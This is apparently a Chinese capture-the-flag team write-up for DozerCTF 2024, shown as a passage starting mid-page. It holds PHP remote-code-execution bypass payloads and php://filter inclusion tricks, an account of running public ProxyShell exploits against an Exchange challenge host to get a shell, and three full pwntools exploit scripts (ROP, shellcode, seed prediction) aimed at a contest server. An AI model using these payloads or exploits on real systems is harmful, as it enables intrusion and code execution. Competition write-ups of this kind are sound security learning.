class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>真狠啊，上面把能禁的都禁了，要不然还是挺简单了，想到之前ctfshow里面可以用scandir看看有什么的。尝试构造一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>试了一下好像不能用.&#x2F;来找,说一下localeconv()</p><p>localeconv() 函数是一个编程语言函数，返回包含本地数字及货币信息格式的数组。这里可以通过这个函数读取当前目录下的文件名称。</p><p><img src="/../../images/dozerctf2024/rce.png" alt="rce"></p><p>可以知道flag就应该在fllllaaag.php，尝试直接得，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Parse error: syntax error, unexpected &#x27;&#123;&#x27; in /var/www/html/fllllaaag.php on line 3<br></code></pre></td></tr></table></figure><p>哎被禁了。那想想其他方法吧。</p><p>还是队友思路好啊我就是大菜狗，再讲一个函数array_flip()</p><p>array_flip () 函数用来交换数组中元素的键和值。array_flip() 返回一个反转后的 array，例如 array 中的键名变成了值，而 array 中的值成了键名。</p><p>简单的说就是下标和内容颠倒，就这么理解。</p><p>array_rand()</p><p>在不改变数组的基础上，从数组中随机的选取一个或多个元素，比如我们在网页上随机显示不同的广告，或者推荐不同的文章等等</p><p>又因为include那些被禁了，（劳累.jpg，也是靠队友，用file就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))));<br></code></pre></td></tr></table></figure><p><img src="/../../images/dozerctf2024/rce1.png" alt="rce1"></p><h2 id="very-long-access"><a href="#very-long-access" class="headerlink" title="very_long_access"></a>very_long_access</h2><p>下载下来简要看一下内容吧，问了一下gpt,回答如下：</p><p>这看起来像是一个网络服务器的日志条目。它包括了一个时间戳、用户代理字符串（表明是运行在 Windows 10 上的 Chrome 版本 108.0.0.0 浏览器），以及一个对资源”A”的GET请求，请求的数据大小为34760字节。有什么关于这个日志条目你想要了解或讨论的吗？</p><p>感觉和wireshark的题目有点像，和时间有关系，发现时间并不是按顺序写的，撸个脚本排一下序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取日志文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;very_long_access.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    log_entries = file.readlines()<br><br><span class="hljs-comment"># 将日志条目解析为元组列表，每个元组包含时间戳和原始日志条目</span><br>parsed_entries = []<br><span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> log_entries:<br>    timestamp_string = entry.split(<span class="hljs-string">&quot; - &quot;</span>)[<span class="hljs-number">0</span>]<br>    parsed_entry = (timestamp_string, entry)<br>    parsed_entries.append(parsed_entry)<br><br><span class="hljs-comment"># 按时间先后顺序排序日志条目</span><br>sorted_entries = <span class="hljs-built_in">sorted</span>(parsed_entries, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># 写入排序后的日志条目到新文件中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sorted_access_logs.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> sorted_entries:<br>        file.write(entry[<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;日志条目已按时间先后顺序排列并保存到 sorted_access_logs.txt 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>排完看后面估计要把get&#x2F;后面的提出来才能有些头绪，再撸个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件 very_long_access.txt 以读取模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sorted_access_logs.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 创建一个空列表，用于存储每行的数据</span><br>    lines = []<br>    <span class="hljs-comment"># 逐行读取文件内容</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-comment"># 找到每行中 &quot;GET /&quot; 后面的内容，并添加到列表中</span><br>        start_index = line.find(<span class="hljs-string">&quot;GET /&quot;</span>) + <span class="hljs-number">5</span><br>        end_index = line.find(<span class="hljs-string">&quot; &quot;</span>, start_index)<br>        request = line[start_index:end_index]<br>        lines.append(request)<br><br><span class="hljs-comment"># 将提取到的数据拼接成一行</span><br>get_requests = <span class="hljs-string">&#x27;&#x27;</span>.join(lines)<br><br><span class="hljs-comment"># 将拼接后的数据写入到新的文件 get_requests.txt 中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;get_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(get_requests)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取并写入完成！&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ctrl+f搜看看有没有惊喜，确实有</p><p><img src="/../../images/dozerctf2024/access.png" alt="access"></p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><p>上面一个可以输入，下面一个好像偏rce,尝试输入了一会并没有得到答案。我试了一下robots.txt，出来了一个dozer_f1ag.php,直接开开不了，那就代码审计一下吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html:/tmp&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>]:<span class="hljs-string">&#x27;filters&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;function.php&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;去找fun吧！！！&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ini_set,规定了访问路径在这两个里面。</p><p>给file赋值</p><p>然后检查URL查询字符串（$_GET）中是否设置了’function’参数。如果’function’参数已设置，则将其值赋给变量$func；否则，将字符串’filters’赋给$func。</p><p>call_user_func这个函数前阵子刚碰过，试过几次觉得应该是用extract解决。该函数用于将数组中的键名作为变量名，键值作为变量值，导入到当前符号表中。</p><p>strpos用于检测有没有，有才可以include,应该是用伪协议,覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>可是要有function.php,再改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/function.php/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>最后构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">extract</span>&amp;<span class="hljs-title">file</span>=<span class="hljs-title">php</span>://<span class="hljs-title">filter</span>/<span class="hljs-title">function</span>.<span class="hljs-title">php</span>/<span class="hljs-title">convert</span>.<span class="hljs-title">base64</span>-<span class="hljs-title">encode</span>/<span class="hljs-title">resource</span>=<span class="hljs-title">dozer_f1ag</span>.<span class="hljs-title">php</span></span><br></code></pre></td></tr></table></figure><p>解一下base64<img src="/../../images/dozerctf2024/ser.png" alt="ser"></p><h2 id="上春山"><a href="#上春山" class="headerlink" title="上春山"></a>上春山</h2><p>二月天杨柳醉春烟..搞错了，看题目。</p><p>什么玩意，我自己整理了一下<img src="/../../images/dozerctf2024/%E4%B8%8A%E6%98%A5%E5%B1%B1.png" alt="上春山"></p><p>分析一下，一开始对暗号，然后聊天说东方有沉船搞个门路赚钱，最后flag应该和沉船有关系。说到这就应该好好拷打出题人了</p><p>官方给了提示不一定在国内，出名的奢侈的。</p><p>我们锁定范围(1911-1949年，出名，国外，奢侈，沉船)</p><p>这不就是出名的泰坦尼克号嘛，最后官方说的知道船可以问，直接给我一串汉字，我们谦虚一下，面向答案的wp写一下。</p><p>载柳度载汪分中中申申秒载爱度中申分载中句月秒</p><p>根据江湖黑话，上面的应该都是数字转化而来的，也就是当时沉船的经纬度转黑话，黑话再转MD5就行，最后就是flag.(好好拷打出题人)</p><h2 id="se"><a href="#se" class="headerlink" title="se"></a>se</h2><p>wav的题目，一般都挺简单的吧</p><p>听一下类似电话拨号的声音，网上的网站一把梭</p><p><img src="/../../images/dozerctf2024/se.png" alt="se"></p><p>962764453，卡壳了不知道接下来怎么写，emmmmm</p><p>还好有万能的队友，用silenteye可以提出zip，再用这个密码就可以得到flag了。</p><h2 id="shuiyin"><a href="#shuiyin" class="headerlink" title="shuiyin"></a>shuiyin</h2><p>嘿嘿，出题人总是不仔细啊，直接给flag也没下，那我接着面向答案的wp了。</p><p>按道理应该是最右边的图片，猜测是盲水印，拖到软件里面解一下就行了吧，然后可以得到flag,(估计本来就简单，上的太匆忙了)</p><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>正常答题就行，最后想抢手速也是于事无补。</p><p>以下部分由队友完成我只是负责拼装。</p><h2 id="简单的域渗透III-flag1"><a href="#简单的域渗透III-flag1" class="headerlink" title="简单的域渗透III-flag1"></a>简单的域渗透III-flag1</h2><p>发现被重定向</p><p><img src="/../../images/dozerctf2024/flag1.png" alt="flag1"></p><p>根据题目发现是exchange+office365</p><p><img src="/../../images/dozerctf2024/flag3.png" alt="flag3"></p><p>查阅文章<a href="https://mp.weixin.qq.com/s/O6a40449vTKWUXS4kwD9xA">记一次曲折的exchange漏洞利用-ProxyMaybeShell (qq.com)</a></p><p>proxyshell一梭拿到token</p><p>脚本代码：</p><p><a href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p><p><img src="/../../images/dozerctf2024/flag4.png" alt="flag4"></p><p>从github上撸到<a href="https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3%E7%9B%B4%E6%8E%A5%E4%B8%80%E6%8A%8A%E6%A2%AD">https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3直接一把梭</a></p><p><img src="/../../images/dozerctf2024/flag5.png" alt="flag5"></p><p><img src="/../../images/dozerctf2024/flag6.png" alt="flag6"></p><p>拿到shell</p><p>群里桌面和vpn两hint，找到如下</p><p><img src="/../../images/dozerctf2024/flag7.png" alt="flag7"></p><p>tar解压取出password</p><p><img src="/../../images/dozerctf2024/flag8.png" alt="flag8"></p><p><img src="/../../images/dozerctf2024/flag9.png" alt="flag9"></p><p>flag{b5c1cd1c-45d8-4c5e-bf2e-d2b87419248f}</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="一个不对劲的溢出"><a href="#一个不对劲的溢出" class="headerlink" title="一个不对劲的溢出"></a>一个不对劲的溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32916</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;aa%37$pbb%36$pcc%35$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;username?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">231</span>-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>p.recvuntil(<span class="hljs-string">&#x27;bb&#x27;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x0000A20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pie--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&#x27;cc&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))<br>pop_rdi = <span class="hljs-number">0x00a83</span>+pie<br>system = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base+<span class="hljs-number">0x001b3d88</span><br>ret = <span class="hljs-number">0x000A84</span><br>main = pie+<span class="hljs-number">0x0007F0</span><br>og = [<span class="hljs-number">0x4f2be</span>,<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>og_yuan = [<span class="hljs-number">0x4f29e</span>,<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>shell = libc_base+og_yuan[<span class="hljs-number">0</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xd0</span>-<span class="hljs-number">0x8</span>)+p64(canary)+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br><span class="hljs-comment">#payload+= p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br>payload+= p64(shell)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32972</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 0x67616c66</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">xor rdi, rdi</span><br><span class="hljs-string">sub rdi, 100</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">xor r10, r10</span><br><span class="hljs-string">mov rax, SYS_openat</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 3</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp-8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_readv</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp+8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_writev</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">231</span>+asm(shellcode)<br>p.sendlineafter(<span class="hljs-string">b&#x27;show me\n&#x27;</span>,shellcode)<br>p.recv()<br></code></pre></td></tr></table></figure><h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32944</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>glibc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>pop_rdi = <span class="hljs-number">0x004014d3</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload+= p64(<span class="hljs-number">0x000401423</span>)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~~\n&#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-glibc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>shell = libc_addr+og[<span class="hljs-number">1</span>]<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(shell)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="pppyyy"><a href="#pppyyy" class="headerlink" title="pppyyy"></a>pppyyy</h2><p>将pyc反编译，解方程组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *  <br><br><span class="hljs-comment"># 创建 14 个未知数  </span><br>nums = [Real(<span class="hljs-string">&#x27;nums%d&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]  <br><br>eqns = [  <br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">3</span> == <span class="hljs-number">56</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">3</span> == <span class="hljs-number">681</span>,<br>(((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span 